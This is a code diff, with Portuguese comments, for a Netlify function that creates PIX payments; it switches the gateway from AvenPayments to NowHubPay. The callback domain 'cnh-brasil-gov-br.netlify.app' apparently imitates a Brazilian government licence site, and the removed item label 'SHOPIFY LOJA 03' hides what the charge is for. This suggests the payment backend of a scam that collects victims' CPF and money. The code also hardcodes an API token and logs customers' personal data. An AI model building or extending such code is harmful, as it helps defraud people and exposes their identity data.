@@ -1,20 +1,50 @@
 const { getSupabase } = require("./lib/supabase");
 
-const AVEN_BASE = "https://api.avenpayments.com";
-const AVEN_API_KEY = process.env.AVEN_API_KEY;
+const NOWHUB_BASE = "https://api.nowhubpay.com";
+const NOWHUB_CLIENT_ID = process.env.NOWHUB_CLIENT_ID;
+const NOWHUB_CLIENT_SECRET = process.env.NOWHUB_CLIENT_SECRET;
 const UTMIFY_TOKEN = "lzASZob4ldSJJc3jT1LILy9alPxWJgpnPhCh";
 const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL;
 const SUPABASE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
 
-// Cache UTMify
+// Cache para token JWT e UTMify
+const tokenCache = {};
 const utmifyCache = new Map();
 const CACHE_TTL = 60000;
 
-function getAuthHeader() {
-  if (!AVEN_API_KEY) {
-    throw new Error("❌ AVEN_API_KEY não configurada!");
+// Obter token JWT da NowHubPay
+async function getNowHubToken() {
+  if (tokenCache.token && tokenCache.expiresAt > Date.now()) {
+    return tokenCache.token;
   }
-  return `Bearer ${AVEN_API_KEY}`;
+
+  if (!NOWHUB_CLIENT_ID || !NOWHUB_CLIENT_SECRET) {
+    throw new Error("❌ NOWHUB_CLIENT_ID ou NOWHUB_CLIENT_SECRET não configurados!");
+  }
+
+  try {
+    const response = await fetch(`${NOWHUB_BASE}/v1/auth/login`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        client_id: NOWHUB_CLIENT_ID,
+        client_secret: NOWHUB_CLIENT_SECRET
+      })
+    });
+
+    const data = await response.json();
+    if (!response.ok) {
+      throw new Error(`Auth failed: ${data.detail || data.title}`);
+    }
+
+    tokenCache.token = data.access_token;
+    tokenCache.expiresAt = Date.now() + (data.expires_in * 1000) - 60000;
+    
+    console.log("[NowHub] ✓ Token obtido com sucesso");
+    return data.access_token;
+  } catch (err) {
+    throw new Error(`Falha ao autenticar com NowHub: ${err.message}`);
+  }
 }
 
 async function sendUtmify(transactionId, status, customer, amountCents, createdAt, utms) {
@@ -31,7 +61,7 @@ async function sendUtmify(transactionId, status, customer, amountCents, createdA
     const netCents = amountCents - gatewayFeeCents;
     const payload = {
       orderId: transactionId,
-      platform: "AvenPayments",
+      platform: "NowHubPay",
       paymentMethod: "pix",
       status,
       createdAt: createdAt || new Date().toISOString().replace("T"," ").slice(0,19),
@@ -127,17 +157,16 @@ function fmtPhone(phone) {
 }
 
 exports.handler = async (event) => {
-  console.log("[PIX-AVEN] ===== FUNÇÃO INICIADA =====");
-  console.log("[PIX-AVEN] AVEN_API_KEY exists:", !!AVEN_API_KEY);
-  console.log("[PIX-AVEN] SUPABASE_URL exists:", !!SUPABASE_URL);
-  console.log("[PIX-AVEN] SUPABASE_KEY exists:", !!SUPABASE_KEY);
+  console.log("[PIX-NOWHUB] ===== FUNÇÃO INICIADA =====");
+  console.log("[PIX-NOWHUB] NOWHUB_CLIENT_ID exists:", !!NOWHUB_CLIENT_ID);
+  console.log("[PIX-NOWHUB] NOWHUB_CLIENT_SECRET exists:", !!NOWHUB_CLIENT_SECRET);
   
-  if (!AVEN_API_KEY) {
-    console.error("❌ ERRO: AVEN_API_KEY não configurada na Netlify!");
+  if (!NOWHUB_CLIENT_ID || !NOWHUB_CLIENT_SECRET) {
+    console.error("❌ ERRO: Credenciais NowHubPay não configuradas na Netlify!");
     return jsonResponse(500, {
       success: false,
       error: "Credenciais da gateway não configuradas",
-      debug: "AVEN_API_KEY não encontrada"
+      debug: "NOWHUB_CLIENT_ID ou NOWHUB_CLIENT_SECRET não encontrados"
     });
   }
 
@@ -171,39 +200,18 @@ exports.handler = async (event) => {
   const utms = body.utm || {};
   const externalRef = `order_${randId}`;
 
-  console.log("[PIX-AVEN] Amount:", amountReais, "Cents:", amountCents);
-  console.log("[PIX-AVEN] Customer:", { name: customerName, email: customerEmail, cpf: customerCpf });
+  console.log("[PIX-NOWHUB] Amount:", amountReais, "Cents:", amountCents);
+  console.log("[PIX-NOWHUB] Customer:", { name: customerName, email: customerEmail, cpf: customerCpf });
 
-  // Payload para AvenPayments - SIMPLIFICADO SEM DELIVERY
-  const payload = {
-    amount: amountCents,
-    currency: "BRL",
-    method: "PIX",
-    description: "SHOPIFY LOJA 03",
-    externalRef: externalRef,
-    notificationUrl: "https://cnh-brasil-gov-br.netlify.app/webhook/payment",
-    payer: {
-      name: customerName,
-      taxId: customerCpf,
-      email: customerEmail,
-      phone: `55${customerPhone}`,
-    },
-    items: [{
-      quantity: 1,
-      name: "SHOPIFY LOJA 03",
-      price: amountCents,
-      type: "DIGITAL",
-    }],
-  };
-
-  let authHeader;
+  // Obter token
+  let token;
   try {
-    authHeader = getAuthHeader();
+    token = await getNowHubToken();
   } catch (err) {
-    console.error("❌ [PIX-AVEN] Auth error:", err.message);
+    console.error("❌ [PIX-NOWHUB] Token error:", err.message);
     return jsonResponse(500, {
       success: false,
-      error: "Credenciais não configuradas",
+      error: "Falha ao autenticar com gateway",
       debug: err.message
     });
   }
@@ -212,11 +220,23 @@ exports.handler = async (event) => {
     const controller = new AbortController();
     const timeout = setTimeout(() => controller.abort(), 30000);
     
-    const resp = await fetch(`${AVEN_BASE}/v1/payment`, {
+    const payload = {
+      amount: amountReais,
+      external_id: externalRef,
+      payer: {
+        name: customerName,
+        document: customerCpf
+      },
+      clientCallbackUrl: "https://cnh-brasil-gov-br.netlify.app/webhook/payment"
+    };
+
+    console.log("[PIX-NOWHUB] Payload:", JSON.stringify(payload, null, 2));
+
+    const resp = await fetch(`${NOWHUB_BASE}/v1/payments/deposit`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
-        "Authorization": authHeader,
+        "Authorization": `Bearer ${token}`,
       },
       body: JSON.stringify(payload),
       signal: controller.signal,
@@ -226,8 +246,8 @@ exports.handler = async (event) => {
     const text = await resp.text();
     if (!resp.ok) {
       let errMsg = text;
-      try { errMsg = JSON.parse(text)?.message || errMsg; } catch {}
-      console.error("[AvenPayments] Erro HTTP:", resp.status, errMsg);
+      try { errMsg = JSON.parse(text)?.detail || JSON.parse(text)?.title || errMsg; } catch {}
+      console.error("[NowHub] Erro HTTP:", resp.status, errMsg);
       return jsonResponse(resp.status, {
         success: false,
         error: errMsg,
@@ -237,7 +257,7 @@ exports.handler = async (event) => {
 
     let parsed = {};
     try { parsed = JSON.parse(text); } catch {
-      console.error("[AvenPayments] Parse error:", text.substring(0, 200));
+      console.error("[NowHub] Parse error:", text.substring(0, 200));
       return jsonResponse(500, {
         success: false,
         error: "Resposta inválida da gateway",
@@ -245,11 +265,11 @@ exports.handler = async (event) => {
       });
     }
 
-    const transactionId = parsed.id || parsed.externalRef || null;
-    const pixCode = parsed.data?.copypaste || null;
+    const transactionId = parsed.transaction_id || null;
+    const pixCode = parsed.pix_copy_paste || null;
 
     if (!transactionId || !pixCode) {
-      console.error("[AvenPayments] Resposta incompleta:", { transactionId, pixCode });
+      console.error("[NowHub] Resposta incompleta:", { transactionId, pixCode });
       return jsonResponse(500, {
         success: false,
         error: "Gateway retornou resposta incompleta",
@@ -257,9 +277,9 @@ exports.handler = async (event) => {
       });
     }
 
-    console.log("[PIX-AVEN] ===== PIX GERADO COM SUCESSO =====");
-    console.log("[PIX-AVEN] Transaction ID:", transactionId);
-    console.log("[PIX-AVEN] PIX Code: ✓ Existe");
+    console.log("[PIX-NOWHUB] ===== PIX GERADO COM SUCESSO =====");
+    console.log("[PIX-NOWHUB] Transaction ID:", transactionId);
+    console.log("[PIX-NOWHUB] PIX Code: ✓ Existe");
 
     // Salvar no Supabase (não bloqueia)
     if (SUPABASE_URL && SUPABASE_KEY) {
@@ -299,7 +319,7 @@ exports.handler = async (event) => {
       pix_code: pixCode,
       brcode: pixCode,
       payload: pixCode,
-      qr_code_image: null,
+      qr_code_image: parsed.pix_qr_code || null,
       transaction_id: transactionId,
       transactionId,
       deposit_id: transactionId,
@@ -307,7 +327,7 @@ exports.handler = async (event) => {
     });
 
   } catch (err) {
-    console.error("[PIX-AVEN] Erro ao chamar gateway:", err.message);
+    console.error("[PIX-NOWHUB] Erro ao chamar gateway:", err.message);
     return jsonResponse(502, {
       success: false,
       error: "Falha ao conectar com gateway: " + String(err)
